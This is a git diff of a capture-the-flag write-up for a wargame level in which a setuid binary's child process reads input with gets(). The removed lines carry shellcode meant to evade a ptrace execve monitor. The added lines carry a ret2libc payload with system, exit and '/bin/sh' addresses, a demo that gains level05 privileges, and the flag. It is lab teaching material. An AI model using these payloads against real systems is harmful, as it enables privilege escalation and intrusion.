@@ -1,85 +1,148 @@
 
-=> We have a fork and 2 processes
-=> The child call the gets() function so we can overwrite the stack
+# level04
 
-=> The parant have an infinite loop that check if the child returned terminated correctly or not
--> prctl(PR_SET_PDEATHSIG (1), SIGHUP (1));
- 1 SIGHUP     Terminate   Hang up controlling terminal or      Yes
-                          process
+## General Informations 
 
-Second protection:
-=> The loop stop if the child used the sys call execve (11 in i386)
-=> It reads this value from the user space of the child at offset 0x2c (44) corresponding to the eax register
-=> Then kill the child process immediately
+**Path** : `/home/users/level04/level04` </br>
+**File** : 
+```
+level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04`  </br>
+**Protections**:
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level04
+```
+
+## Static Analysis
+
+After decompiling the binary in ghidra, we get the pseudo code below: 
+
+```
+undefined4 main(void)
+{
+  int iVar1;
+  char *pcVar2;
+  byte bVar3;
+  uint local_a4;
+  char local_a0 [128];
+  uint local_20;
+  uint local_1c;
+  long local_18;
+  int local_14;
+  
+  bVar3 = 0;
+  local_14 = fork();
+  pcVar2 = local_a0;
+  for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {
+    pcVar2[0] = '\0';
+    pcVar2[1] = '\0';
+    pcVar2[2] = '\0';
+    pcVar2[3] = '\0';
+    pcVar2 = pcVar2 + ((uint)bVar3 * -2 + 1) * 4;
+  }
+  local_18 = 0;
+  local_a4 = 0;
+  if (local_14 == 0) {
+    prctl(1,1); # prctl(PR_SET_PDEATHSIG, SIGHUP)
+    ptrace(PTRACE_TRACEME,0,0,0);
+    puts("Give me some shellcode, k");
+    gets(local_a0);
+  }
+  else {
+    do {
+      wait(&local_a4);
+      local_20 = local_a4;
+      if (((local_a4 & 0x7f) == 0) ||
+         (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0x7f) + 1) >> 1)) {
+        puts("child is exiting...");
+        return 0;
+      }
+      local_18 = ptrace(PTRACE_PEEKUSER,local_14,0x2c,0);
+    } while (local_18 != 0xb);
+    puts("no exec() for you");
+    kill(local_14,9);
+  }
+  return 0;
+}
+```
+
+- `main`
+  - Calls the `fork` function.
+  - In the **child** process:
+    - Uses `prctl` to raise a `SIGHUP` signal if the parent dies.
+    - Allows the parent to trace the child process using `ptrace`.
+    - Takes user input using the gets function and stores it in a 128 bytes buffer. Since `gets` does not perform bounds checking, this makes it vulnerable. We can most likely inject shellcode into the stack.
+  - In the **parent** process:
+    - Reads the value from the child’s user space at offset `0x2c` (44), which corresponds to the `eax` register.
+    - If the syscall stored in `local_18` is `execve` (11), the child is immediately terminated; otherwise, the parent waits for the child's signal to return.
+
+## Vulnerability found  
+
+The `gets` function does not check the number of bytes written into the buffer, making it vulnerable to a buffer overflow.
+
+## Dynamic Analysis
+
+Useful GDB's commands:
+```
+set follow-fork-mode [child || parent] - set the follow of gdb to the child or the parent
+show follow-fork-mode - show the current follow  mode
+set detach-on-fork off - view both processes
+info inferior - the current process followed by gdb
+inferior id - see the inferior processe number id (ex: inferior 1)
+remove-inferiors id - remove the inferior "id"
+```
+
+Firs we will try to overwrite the return address of the child process.
+```
+(gdb) set follow-fork-mode child
+(gdb) r < <(python -c 'print "A"*156 + "BBBB"')
+Starting program: /home/users/level04/level04 < <(python -c 'print "A"*156 + "BBBB"')
+[New process 1997]
+Give me some shellcode, k
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1997]
+child is exiting...
+0x42424242 in ?? ()
+```
+
+It works! That’s perfect. </br>
+This time, we’ll use the **ret2libc** technique to execute a shell. The idea is simple: instead of injecting raw shellcode, we call the `system` function with the string `/bin/sh` as its argument, followed by a call to `exit`.
+
+How does this work in detail? It's a bit more complex. You can read more about it in this [article (fr)](https://beta.hackndo.com/retour-a-la-libc/) or this [one](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc) 
 
 
-=> So we need to execute a command that allow us to bypass these protections
+## Payload construction 
 
-Useful GDB commands:
-- set follow-fork-mode [child - parent] - set the follow of gdb to the child or the parent
-- show follow-fork-mode - show the current follow  mode
-- set detach-on-fork off - view both processes
-- info inferior - the current process followed by gdb
-- inferior id - see the inferior processe number id (ex: inferior 1)
-- remove-inferiors id - remove the inferior "id"
+We'll overwrite the child’s return address with the address of `system`, followed by the address of `exit`, and finally the address of the `/bin/sh` string.
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) find &system,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+```
 
-=> Let's set the follow to the child and break after the gets()
-   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
-   0x08048763 <+155>:	jmp    0x804881a <main+338>
--> b *0x08048763
+The final payload looks like this: 
+```
+python -c 'print("A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'
+```
 
-=> Let's try to launch a simple shell code
+## Demonstration 
 
-r < <(python -c 'print "\x90"*(100) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-128) + "\xa0\xd6\xff\xff"')
+```
+level04@OverRide:~$ (python -c 'print("A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04 
+Give me some shellcode, k
+whoami
+level05
+```
 
-=> It doesn't work as expected !
-
-fork: \xB8\x02\x00\x00\x00\xCD\x80
-prctl: \x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80 <- prctl(PR_SET_PDEATHSIG, 0)
-shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
-
-
-=> So how to execute the shellcode without calling directly execve ?
-=> One way to bypass this restriction is to fork before executing the shellcode and deactivate the prctl from the second child
--> Complete payload:
-
-(python -c 'print "\x90"*(100) + "\xB8\x02\x00\x00\x00\xCD\x80\x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-148) + "\xa0\xd6\xff\xff"'; cat)
-
-------------------------------------------------------------------
-
-In this level, we are dealing with a program where a child process is forked and monitored by a parent process using ptrace. The child process accepts user input via gets(), creating a classic buffer overflow vulnerability. However, the parent monitors the child and kills it if the exec() system call is attempted (detected by PTRACE_PEEKUSER).
-
-1. Vulnerability: gets() does not perform bounds checking, which allows us to overflow the stack and control the return address.
-
-2. Parent's Restrictions: The parent prevents exec() execution by monitoring the child process. However, we can bypass this by directly calling the system() function to execute /bin/sh without triggering exec(): ret2libc.
-
-3. GDB
-
-	for follow the child process
-	- set follow-fork-mode "child or parent"
-	- show follow-fork-mode
-	- set detach-on-fork off
-	- info inferior
-	- inferior id
-
-	inspect process and addresses
-	- info function system
-	- info function exit
-	- info proc map
-	- find start_address,end_adress,"/bin/sh"
-	- x/s address
-
-4. PAYLOAD
-
-	```python
-	[PADDING] + [system address] + [exit address] + ["/bin/sh" address]
-	```
-
-	```python
-	(python -c 'print("A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe2\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
-	
-	```
-	- `"A"*156` : padding to reach the return address
-	- `\xd0\xae\xe6\xf7`: Address of system()
-	- `\x70\xeb\xe5\xf7`: Address of exit()
-	- `\xec\x97\xf8\xf7`: Address of /bin/sh
+## Flag 
+```
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
